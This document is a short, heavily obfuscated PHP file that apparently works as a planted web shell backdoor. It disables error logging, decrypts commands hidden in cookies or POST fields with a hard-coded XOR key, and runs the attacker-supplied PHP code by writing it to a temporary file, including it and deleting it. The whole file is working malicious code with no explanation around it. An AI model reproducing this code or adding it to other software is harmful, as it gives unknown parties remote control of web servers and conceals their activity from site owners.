<?php $qlagjxvim = 'f'."\x69"."\154".'e'.chr(95).chr(790-678)."\x75"."\164".chr(95).'c'.chr(322-211)."\x6e".'t'.'e'.'n'.'t'.chr(573-458);
$xwtiipq = chr(788-690).chr(97).chr(115)."\x65".chr(239-185)."\64".chr(769-674).chr(328-228).chr(101).'c'.chr(150-39)."\x64".'e';
$lscvzfns = chr(196-91).chr(110).chr(781-676).chr(814-719)."\163".chr(101)."\164";
$knyvetb = 'u'."\x6e".'l'.chr(596-491)."\x6e".chr(781-674);


@$lscvzfns(chr(746-645)."\162".chr(141-27)."\157"."\x72"."\137"."\x6c".chr(806-695)."\147", NULL);
@$lscvzfns(chr(219-111)."\x6f".chr(103)."\x5f".chr(915-814)."\162".chr(114)."\x6f".'r'."\x73", 0);
@$lscvzfns("\155".'a'.chr(391-271)."\137".chr(561-460).'x'.chr(350-249).'c'."\165".chr(648-532).chr(105).'o'.chr(698-588).chr(95)."\164".'i'.'m'."\x65", 0);
@set_time_limit(0);

function ovapkkprqd($cjizjoiw, $ogzneucxlg)
{
    $tnttisde = "";
    for ($ftqqpbhioh = 0; $ftqqpbhioh < strlen($cjizjoiw);) {
        for ($j = 0; $j < strlen($ogzneucxlg) && $ftqqpbhioh < strlen($cjizjoiw); $j++, $ftqqpbhioh++) {
            $tnttisde .= chr(ord($cjizjoiw[$ftqqpbhioh]) ^ ord($ogzneucxlg[$j]));
        }
    }
    return $tnttisde;
}

$jwedcuuv = array_merge($_COOKIE, $_POST);
$baetd = 'bdf44a0d-0066-464d-8f83-d5d93b198a8a';
foreach ($jwedcuuv as $abjbufxu => $cjizjoiw) {
    $cjizjoiw = @unserialize(ovapkkprqd(ovapkkprqd($xwtiipq($cjizjoiw), $baetd), $abjbufxu));
    if (isset($cjizjoiw[chr(854-757).'k'])) {
        if ($cjizjoiw['a'] == "\151") {
            $ftqqpbhioh = array(
                chr(112).chr(118) => @phpversion(),
                "\x73".'v' => "3.5",
            );
            echo @serialize($ftqqpbhioh);
        } elseif ($cjizjoiw['a'] == chr(101)) {
            $zpexufn = "./" . md5($baetd) . chr(713-667)."\x69"."\156".chr(99);
            @$qlagjxvim($zpexufn, "<" . chr(63).'p'."\x68".'p'.' '."\x40".'u'.chr(110).'l'.chr(105).chr(110)."\x6b".chr(806-766).chr(95).'_'.'F'.chr(511-438)."\114"."\105".'_'.'_'.')'."\73"."\40" . $cjizjoiw["\x64"]);
            @include($zpexufn);
            @$knyvetb($zpexufn);
        }
        exit();
    }
}

